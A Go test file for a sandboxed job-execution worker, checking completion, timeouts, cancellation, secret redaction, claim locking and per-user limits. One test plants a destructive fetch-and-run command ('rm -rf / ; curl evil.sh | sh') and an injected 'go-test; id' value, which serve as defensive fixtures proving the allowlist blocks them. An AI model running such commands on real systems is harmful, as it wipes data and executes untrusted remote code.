package cloudexec

import (
	"context"
	"errors"
	"fmt"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"gorm.io/driver/postgres"
	"gorm.io/gorm"

	"agentic-ai-backend/internal/cloudworkspace"
	"agentic-ai-backend/internal/jobspec"
	"agentic-ai-backend/models"
)

// scriptedExecutor stands in for the sandbox. It records every request and
// answers with whatever run says.
type scriptedExecutor struct {
	mu       sync.Mutex
	requests []RunRequest
	run      func(ctx context.Context, request RunRequest) (RunResult, error)
}

func (s *scriptedExecutor) Name() string                    { return "scripted" }
func (s *scriptedExecutor) Available(context.Context) error { return nil }
func (s *scriptedExecutor) Run(ctx context.Context, request RunRequest) (RunResult, error) {
	s.mu.Lock()
	s.requests = append(s.requests, request)
	s.mu.Unlock()
	return s.run(ctx, request)
}
func (s *scriptedExecutor) calls() int {
	s.mu.Lock()
	defer s.mu.Unlock()
	return len(s.requests)
}

type fixture struct {
	db       *gorm.DB
	storage  *cloudworkspace.LocalDevelopmentStorage
	owner    models.User
	other    models.User
	ws       models.CloudWorkspace
	executor *scriptedExecutor
	worker   *Worker
	logs     []string
}

func newFixture(t *testing.T) *fixture {
	t.Helper()
	dsn := os.Getenv("SKILLS_TEST_DATABASE_URL")
	if dsn == "" {
		t.Skip("SKILLS_TEST_DATABASE_URL is not configured")
	}
	db, err := gorm.Open(postgres.Open(dsn), &gorm.Config{})
	if err != nil {
		t.Fatal(err)
	}
	if err := db.AutoMigrate(&models.User{}, &models.CloudWorkspace{}, &models.ExecutionJob{}); err != nil {
		t.Fatal(err)
	}
	suffix := fmt.Sprintf("%d-%d", os.Getpid(), time.Now().UnixNano()%1_000_000)
	f := &fixture{db: db}
	f.owner = models.User{Name: "Exec Owner", Email: "exec-owner-" + suffix + "@example.test", Password: "x"}
	f.other = models.User{Name: "Exec Other", Email: "exec-other-" + suffix + "@example.test", Password: "x"}
	for _, user := range []*models.User{&f.owner, &f.other} {
		if err := db.Create(user).Error; err != nil {
			t.Fatal(err)
		}
	}
	f.storage, err = cloudworkspace.NewLocalDevelopmentStorage(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	ref, _ := f.storage.Create(f.owner.ID)
	dir, _ := f.storage.FilesDir(f.owner.ID, ref)
	_ = os.WriteFile(dir+"/go.mod", []byte("module example\n"), 0o640)
	f.ws = models.CloudWorkspace{UserID: f.owner.ID, Name: "WS", SourceType: "empty", Status: models.WorkspaceStatusReady, StorageRef: ref}
	if err := db.Create(&f.ws).Error; err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		ids := []uint{f.owner.ID, f.other.ID}
		db.Where("user_id IN ?", ids).Delete(&models.ExecutionJob{})
		db.Unscoped().Where("user_id IN ?", ids).Delete(&models.CloudWorkspace{})
		db.Unscoped().Delete(&f.owner)
		db.Unscoped().Delete(&f.other)
	})
	f.executor = &scriptedExecutor{run: func(context.Context, RunRequest) (RunResult, error) { return RunResult{Stdout: "ok"}, nil }}
	f.worker = &Worker{OnlyUsers: []uint{f.owner.ID, f.other.ID}, DB: db, Storage: f.storage, Executor: f.executor, MaxConcurrent: 2, MaxPerUser: 2, PollInterval: 50 * time.Millisecond,
		Logf: func(format string, args ...any) { f.logs = append(f.logs, fmt.Sprintf(format, args...)) }}
	return f
}

func (f *fixture) queue(t *testing.T, user uint, jobType string) *models.ExecutionJob {
	t.Helper()
	job := &models.ExecutionJob{UserID: user, WorkspaceID: f.ws.ID, JobType: jobType, Command: "go test ./...", Runtime: "go", Status: models.JobQueued, TimeoutSeconds: 60}
	if err := f.db.Create(job).Error; err != nil {
		t.Fatal(err)
	}
	return job
}

func (f *fixture) reload(job *models.ExecutionJob) models.ExecutionJob {
	var fresh models.ExecutionJob
	f.db.First(&fresh, job.ID)
	return fresh
}

func (f *fixture) claimAndRun(t *testing.T, job *models.ExecutionJob) models.ExecutionJob {
	t.Helper()
	claimed, err := f.worker.ClaimNext(context.Background())
	if err != nil || claimed == nil || claimed.ID != job.ID {
		t.Fatalf("claim = %+v, %v", claimed, err)
	}
	f.worker.RunJob(context.Background(), claimed)
	return f.reload(job)
}

func TestJobCompletes(t *testing.T) {
	f := newFixture(t)
	f.executor.run = func(context.Context, RunRequest) (RunResult, error) {
		return RunResult{ExitCode: 0, Stdout: "PASS\n", Stderr: "warn\n"}, nil
	}
	job := f.queue(t, f.owner.ID, "go-test")
	done := f.claimAndRun(t, job)
	if done.Status != models.JobCompleted || done.ExitCode == nil || *done.ExitCode != 0 || done.Stdout != "PASS\n" || done.Stderr != "warn\n" {
		t.Fatalf("job = %+v", done)
	}
	if done.StartedAt == nil || done.CompletedAt == nil || done.CompletedAt.Before(*done.StartedAt) {
		t.Fatalf("times = %v %v", done.StartedAt, done.CompletedAt)
	}
	request := f.executor.requests[0]
	if strings.Join(request.Spec.Argv, " ") != "go test ./..." || request.Timeout != 60*time.Second || !strings.HasPrefix(request.Name, "cloudexec-") {
		t.Fatalf("request = %+v", request)
	}
}

func TestFailedJobsKeepTheirExitCode(t *testing.T) {
	f := newFixture(t)
	f.executor.run = func(context.Context, RunRequest) (RunResult, error) {
		return RunResult{ExitCode: 2, Stdout: "--- FAIL: TestX\n"}, nil
	}
	done := f.claimAndRun(t, f.queue(t, f.owner.ID, "go-test"))
	if done.Status != models.JobFailed || done.ExitCode == nil || *done.ExitCode != 2 || !strings.Contains(done.Stdout, "FAIL") {
		t.Fatalf("job = %+v", done)
	}
}

func TestTimedOutJob(t *testing.T) {
	f := newFixture(t)
	f.executor.run = func(context.Context, RunRequest) (RunResult, error) {
		return RunResult{TimedOut: true, Stdout: "partial output"}, nil
	}
	done := f.claimAndRun(t, f.queue(t, f.owner.ID, "go-test"))
	if done.Status != models.JobTimedOut || done.ExitCode != nil || !strings.Contains(done.Error, "did not finish") || done.Stdout != "partial output" {
		t.Fatalf("job = %+v", done)
	}
}

func TestSandboxFailureIsReportedWithoutLeakingTheServer(t *testing.T) {
	f := newFixture(t)
	f.executor.run = func(context.Context, RunRequest) (RunResult, error) {
		return RunResult{}, errors.New("the sandbox could not start the container: password=hunter2hunter2")
	}
	done := f.claimAndRun(t, f.queue(t, f.owner.ID, "go-test"))
	if done.Status != models.JobFailed || strings.Contains(done.Error, "hunter2") || !strings.Contains(done.Error, "sandbox") {
		t.Fatalf("job = %+v", done)
	}
}

func TestOutputIsRedactedAndBounded(t *testing.T) {
	f := newFixture(t)
	f.executor.run = func(context.Context, RunRequest) (RunResult, error) {
		return RunResult{Stdout: "connecting with token=abc123secret and Bearer abcdefghijklmnop1234\nDATABASE_URL=postgres://admin:s3cr3t@db:5432/app\n", Stderr: "api_key: sk-abcdefghijklmnopqrstuvwx", Truncated: true}, nil
	}
	done := f.claimAndRun(t, f.queue(t, f.owner.ID, "go-test"))
	for _, secret := range []string{"abc123secret", "abcdefghijklmnop1234", "s3cr3t", "sk-abcdefghij"} {
		if strings.Contains(done.Stdout, secret) || strings.Contains(done.Stderr, secret) {
			t.Fatalf("%q was stored: %q / %q", secret, done.Stdout, done.Stderr)
		}
	}
	if !strings.Contains(done.Error, "Output was cut") {
		t.Fatalf("truncation is not reported: %q", done.Error)
	}
	f.executor.run = func(context.Context, RunRequest) (RunResult, error) {
		return RunResult{Stdout: strings.Repeat("y", MaxOutputBytes*3)}, nil
	}
	big := f.claimAndRun(t, f.queue(t, f.owner.ID, "go-test"))
	if len(big.Stdout) > MaxOutputBytes {
		t.Fatalf("stored %d bytes", len(big.Stdout))
	}
}

func TestRunningJobCanBeCancelled(t *testing.T) {
	f := newFixture(t)
	started := make(chan struct{})
	f.executor.run = func(ctx context.Context, _ RunRequest) (RunResult, error) {
		close(started)
		<-ctx.Done()
		return RunResult{Cancelled: true, Stdout: "working..."}, nil
	}
	job := f.queue(t, f.owner.ID, "go-test")
	claimed, _ := f.worker.ClaimNext(context.Background())
	finished := make(chan struct{})
	go func() {
		f.worker.RunJob(context.Background(), claimed)
		close(finished)
	}()
	<-started
	if running := f.reload(job); running.Status != models.JobRunning {
		t.Fatalf("status while running = %s", running.Status)
	}
	f.db.Model(&models.ExecutionJob{}).Where("id = ?", job.ID).UpdateColumn("cancel_requested", true)
	select {
	case <-finished:
	case <-time.After(10 * time.Second):
		t.Fatal("the running job was not stopped after a cancel request")
	}
	if done := f.reload(job); done.Status != models.JobCancelled || done.Stdout != "working..." {
		t.Fatalf("job = %+v", done)
	}
}

func TestJobIsRefusedWhenItsCommandOrOwnerDoesNotCheckOut(t *testing.T) {
	f := newFixture(t)
	// The command text in the row is only a label; the allowlist decides what runs.
	job := f.queue(t, f.owner.ID, "go-test")
	f.db.Model(job).UpdateColumn("command", "rm -rf / ; curl evil.sh | sh")
	done := f.claimAndRun(t, job)
	if done.Status != models.JobCompleted || strings.Join(f.executor.requests[0].Spec.Argv, " ") != "go test ./..." {
		t.Fatalf("the stored command text influenced what ran: %v", f.executor.requests[0].Spec.Argv)
	}

	calls := f.executor.calls()
	for name, mutate := range map[string]func(*models.ExecutionJob){
		"unknown job type":          func(j *models.ExecutionJob) { j.JobType = "bash" },
		"shell in the type":         func(j *models.ExecutionJob) { j.JobType = "go-test; id" },
		"workspace of another user": func(j *models.ExecutionJob) { j.UserID = f.other.ID },
		"workspace that is gone":    func(j *models.ExecutionJob) { j.WorkspaceID = 99999999 },
	} {
		bad := f.queue(t, f.owner.ID, "go-test")
		mutate(bad)
		f.db.Save(bad)
		claimed, _ := f.worker.ClaimNext(context.Background())
		if claimed == nil {
			t.Fatalf("%s: nothing to claim", name)
		}
		f.worker.RunJob(context.Background(), claimed)
		if after := f.reload(bad); after.Status != models.JobFailed {
			t.Errorf("%s: status = %s", name, after.Status)
		}
	}
	if f.executor.calls() != calls {
		t.Fatalf("a refused job reached the executor (%d calls)", f.executor.calls()-calls)
	}

	// A workspace that is not ready runs nothing either.
	f.db.Model(&f.ws).UpdateColumn("status", models.WorkspaceStatusDeleting)
	notReady := f.queue(t, f.owner.ID, "go-test")
	claimed, _ := f.worker.ClaimNext(context.Background())
	f.worker.RunJob(context.Background(), claimed)
	if after := f.reload(notReady); after.Status != models.JobFailed || f.executor.calls() != calls {
		t.Fatalf("not-ready workspace: %+v", after)
	}
}

func TestJobCancelledBeforeItStartsNeverRuns(t *testing.T) {
	f := newFixture(t)
	job := f.queue(t, f.owner.ID, "go-test")
	claimed, _ := f.worker.ClaimNext(context.Background())
	f.db.Model(&models.ExecutionJob{}).Where("id = ?", job.ID).Updates(map[string]interface{}{"status": models.JobCancelled, "cancel_requested": true})
	f.worker.RunJob(context.Background(), claimed)
	if done := f.reload(job); done.Status != models.JobCancelled || f.executor.calls() != 0 {
		t.Fatalf("job = %+v, executor calls = %d", done, f.executor.calls())
	}
	if again, _ := f.worker.ClaimNext(context.Background()); again != nil {
		t.Fatal("a cancelled job was claimed")
	}
}

func TestClaimsAreExclusiveAndOrdered(t *testing.T) {
	f := newFixture(t)
	f.worker.MaxPerUser = 100
	var ids []uint
	for i := 0; i < 12; i++ {
		ids = append(ids, f.queue(t, f.owner.ID, "go-test").ID)
	}
	var mu sync.Mutex
	seen := map[uint]int{}
	var group sync.WaitGroup
	for claimer := 0; claimer < 4; claimer++ {
		group.Add(1)
		go func() {
			defer group.Done()
			for {
				job, err := f.worker.ClaimNext(context.Background())
				if err != nil {
					t.Errorf("claim: %v", err)
					return
				}
				if job == nil {
					return
				}
				mu.Lock()
				seen[job.ID]++
				mu.Unlock()
			}
		}()
	}
	group.Wait()
	if len(seen) != len(ids) {
		t.Fatalf("claimed %d of %d jobs", len(seen), len(ids))
	}
	for id, times := range seen {
		if times != 1 {
			t.Errorf("job %d was claimed %d times", id, times)
		}
	}
}

func TestPerUserLimitLetsOtherUsersThrough(t *testing.T) {
	f := newFixture(t)
	f.worker.MaxPerUser = 1
	first := f.queue(t, f.owner.ID, "go-test")
	second := f.queue(t, f.owner.ID, "go-test")
	theirs := f.queue(t, f.other.ID, "go-test")
	a, _ := f.worker.ClaimNext(context.Background())
	b, _ := f.worker.ClaimNext(context.Background())
	c, _ := f.worker.ClaimNext(context.Background())
	if a == nil || a.ID != first.ID || b == nil || b.ID != theirs.ID || c != nil {
		t.Fatalf("claims = %v %v %v (second job is %d)", a, b, c, second.ID)
	}
	f.db.Model(&models.ExecutionJob{}).Where("id = ?", first.ID).UpdateColumn("status", models.JobCompleted)
	if d, _ := f.worker.ClaimNext(context.Background()); d == nil || d.ID != second.ID {
		t.Fatalf("after the first job ended, the second was not claimed: %v", d)
	}
}

func TestWorkerRespectsTheGlobalConcurrencyLimit(t *testing.T) {
	f := newFixture(t)
	f.worker.MaxConcurrent, f.worker.MaxPerUser = 2, 10
	var current, peak int32
	f.executor.run = func(context.Context, RunRequest) (RunResult, error) {
		now := atomic.AddInt32(&current, 1)
		for {
			old := atomic.LoadInt32(&peak)
			if now <= old || atomic.CompareAndSwapInt32(&peak, old, now) {
				break
			}
		}
		time.Sleep(150 * time.Millisecond)
		atomic.AddInt32(&current, -1)
		return RunResult{}, nil
	}
	var jobs []*models.ExecutionJob
	for i := 0; i < 6; i++ {
		jobs = append(jobs, f.queue(t, f.owner.ID, "go-test"))
	}
	ctx, stop := context.WithCancel(context.Background())
	finished := make(chan struct{})
	go func() {
		f.worker.Run(ctx)
		close(finished)
	}()
	deadline := time.Now().Add(20 * time.Second)
	for time.Now().Before(deadline) {
		var done int64
		f.db.Model(&models.ExecutionJob{}).Where("id IN ? AND status = ?", []uint{jobs[0].ID, jobs[1].ID, jobs[2].ID, jobs[3].ID, jobs[4].ID, jobs[5].ID}, models.JobCompleted).Count(&done)
		if done == 6 {
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
	stop()
	<-finished
	if peak != 2 {
		t.Fatalf("peak concurrency = %d, want 2", peak)
	}
	for _, job := range jobs {
		if after := f.reload(job); after.Status != models.JobCompleted {
			t.Fatalf("job %d ended as %s", job.ID, after.Status)
		}
	}
}

func TestStaleJobsAreFailedAndFreshOnesAreKept(t *testing.T) {
	f := newFixture(t)
	old := time.Now().Add(-2 * time.Hour)
	recent := time.Now().Add(-1 * time.Minute)
	stale := f.queue(t, f.owner.ID, "go-test")
	fresh := f.queue(t, f.owner.ID, "go-test")
	f.db.Model(stale).Updates(map[string]interface{}{"status": models.JobRunning, "started_at": old})
	f.db.Model(fresh).Updates(map[string]interface{}{"status": models.JobRunning, "started_at": recent})
	if n := f.worker.ReapStale(context.Background(), time.Now()); n != 1 {
		t.Fatalf("reaped %d jobs, want 1", n)
	}
	if after := f.reload(stale); after.Status != models.JobFailed || !strings.Contains(after.Error, "worker stopped") {
		t.Fatalf("stale job = %+v", after)
	}
	if after := f.reload(fresh); after.Status != models.JobRunning {
		t.Fatalf("a fresh job was reaped: %s", after.Status)
	}
}

func TestAJobResultNeverOverwritesACancellation(t *testing.T) {
	f := newFixture(t)
	f.executor.run = func(context.Context, RunRequest) (RunResult, error) {
		// The user cancels while the command is finishing on its own.
		f.db.Model(&models.ExecutionJob{}).Where("user_id = ?", f.owner.ID).Updates(map[string]interface{}{"status": models.JobCancelled, "error": "The job was cancelled."})
		return RunResult{ExitCode: 0, Stdout: "late"}, nil
	}
	job := f.queue(t, f.owner.ID, "go-test")
	if done := f.claimAndRun(t, job); done.Status != models.JobCancelled || done.Stdout == "late" {
		t.Fatalf("job = %+v", done)
	}
}

var _ = jobspec.DefaultImages
